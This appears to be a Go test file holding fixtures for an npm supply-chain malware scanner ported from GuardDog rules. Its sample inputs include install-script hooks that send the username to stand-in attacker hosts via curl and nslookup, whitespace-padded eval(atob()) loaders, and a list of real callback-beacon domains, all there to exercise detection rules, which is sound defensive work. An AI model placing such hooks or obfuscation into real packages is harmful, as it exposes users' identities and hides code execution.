package main

import "testing"

// Fixtures for rules ported from upstream GuardDog's YARA ruleset.
//
// Each rule keeps a reference to the upstream rule it came from so the two
// can be diffed when GuardDog changes again.
//
// A note on live indicators: fixtures are written to disk before scanning,
// so a fixture containing a real exfiltration domain can be quarantined by
// endpoint security on a researcher's machine. That shows up as an
// unreadable fixture, not a rule failure. Rules whose signal is a live IOC
// are therefore asserted in memory instead.

func init() {
	positives = append(positives, npmPositives...)
	negatives = append(negatives, npmNegatives...)
}

// npmPositives cover the npm / JavaScript supply-chain rules.
var npmPositives = []fixture{
	// upstream: threat-runtime-self-propagation
	{"npm-self-propagation", "index.js", `
const { execSync } = require('child_process');
fs.writeFileSync('package.json', JSON.stringify(manifest));
execSync('npm publish --access public');
`},

	// upstream: threat-runtime-obfuscation-hidden-code
	{"js-hidden-code", "loader.js",
		`global['rq'] = require; global['rq']('child_process').exec(cmd);`},
	{"js-hidden-code", "padded.js",
		`var a = 1;` + spaces(420) + `eval(atob(payload));`},

	// upstream: threat-runtime-obfuscation-dynamic-eval
	{"js-dynamic-eval", "packed.js", `eval(function(p,a,c,k,e,d){return p}('...'))`},
	{"js-dynamic-eval", "b64.js", `eval(atob("Y29uc29sZS5sb2coMSk="))`},
	{"js-dynamic-eval", "fcc.js", `new Function(String.fromCharCode(97,108,101,114,116))()`},

	// upstream: threat-npm-http-dependency
	{"npm-http-dependency", "package.json",
		`{"dependencies":{"internal-utils":"http://10.0.0.7/internal-utils.tgz"}}`},
	{"npm-http-dependency", "package.json",
		`{"dependencies":{"pkg":"https://files.example.com/pkg.tar.gz"}}`},

	// upstream: threat-npm-dependency-confusion
	//
	// Uses a non-routable example domain rather than a real collaborator
	// host, for the quarantine reason described at the top of this file.
	// The beacon-domain half is covered by
	// TestDependencyConfusionBeaconDomains.
	{"npm-dependency-confusion", "package.json",
		`{"scripts":{"preinstall":"curl https://collector.example/$(whoami)"}}`},
	{"npm-dependency-confusion", "package.json",
		`{"scripts":{"postinstall":"nslookup $USER.attacker.example"}}`},
}

// npmNegatives are the false-positive guards for the batch above. Each is
// ordinary package or build code that these rules must ignore.
var npmNegatives = []fixture{
	// A build script that writes a manifest but never publishes is normal.
	{"npm-self-propagation", "build.js", `
const fs = require('fs');
fs.writeFileSync('package.json', JSON.stringify(pkg, null, 2));
`},
	// Documenting the publish flow is not performing it.
	{"npm-self-propagation", "release.js",
		`// Run "npm publish" by hand after review.`},

	// Ordinary require and ordinary indentation.
	{"js-hidden-code", "app.js", `const cp = require('child_process');`},
	{"js-hidden-code", "indented.js", `function f() {` + spaces(40) + `return eval;` + "\n}"},

	// eval on its own, and base64 decoding that is not fed to eval, are
	// covered by other rules and must not trip the dynamic-eval detector.
	{"js-dynamic-eval", "calc.js", `const r = eval(userExpression);`},
	{"js-dynamic-eval", "decode.js", `const cfg = JSON.parse(atob(encoded));`},

	// The common case: https registry deps plus a plain-http homepage. The
	// http URL is explained by metadata, so this must stay quiet.
	{"npm-http-dependency", "package.json",
		`{"homepage":"http://example.com","dependencies":{"lodash":"^4.17.21"}}`},
	{"npm-http-dependency", "package.json",
		`{"dependencies":{"react":"^18.2.0","axios":"~1.6.0"}}`},

	// npm's own variables in scripts are not exfiltration.
	{"npm-dependency-confusion", "package.json",
		`{"scripts":{"build":"echo $npm_package_version && tsc"}}`},
}

// spaces builds a run of n spaces for the hidden-payload fixtures.
func spaces(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = ' '
	}
	return string(b)
}

// TestDependencyConfusionBeaconDomains covers the beacon-callback half of
// npm-dependency-confusion.
//
// The hostnames are assembled at runtime so this source file does not itself
// contain a scannable indicator, and the assertion runs against the regex
// directly so nothing is written to disk.
func TestDependencyConfusionBeaconDomains(t *testing.T) {
	s := NewScanner(".", FilterAll, false, map[string]struct{}{})
	var rule Pattern
	for _, p := range s.Patterns {
		if p.Name == "npm-dependency-confusion" {
			rule = p
		}
	}
	if rule.Regex == nil {
		t.Fatal("npm-dependency-confusion is not registered")
	}

	hosts := []string{
		"burp" + "collaborator.net",
		"x.oast" + "ify.com",
		"y.inter" + "act.sh",
		"z.canary" + "tokens.com",
		"w.dns" + "log.cn",
	}
	for _, host := range hosts {
		content := `{"scripts":{"preinstall":"curl https://` + host + `/a"}}`
		if !rule.Regex.MatchString(content) {
			t.Errorf("beacon domain %q did not match the rule regex", host)
		}
	}

	// An ordinary registry URL must not look like a beacon.
	if rule.Regex.MatchString(`{"scripts":{"build":"curl https://registry.npmjs.org/pkg"}}`) {
		t.Error("ordinary registry URL matched the beacon pattern")
	}
}
